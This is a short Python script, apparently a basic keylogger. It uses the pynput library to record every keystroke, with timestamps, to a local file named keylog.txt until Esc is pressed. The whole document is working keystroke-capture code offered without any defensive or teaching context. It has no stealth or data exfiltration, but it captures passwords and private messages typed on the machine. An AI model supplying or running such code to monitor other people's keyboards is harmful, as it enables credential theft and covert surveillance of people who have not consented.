
from pynput import keyboard
import logging

# Set up logging to log keystrokes to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the pressed key
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Handle special keys (like Ctrl, Alt, etc.)
        logging.info(f'Special key {key} pressed')

def on_release(key):
    # Stop listener if Esc is pressed
    if key == keyboard.Key.esc:
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
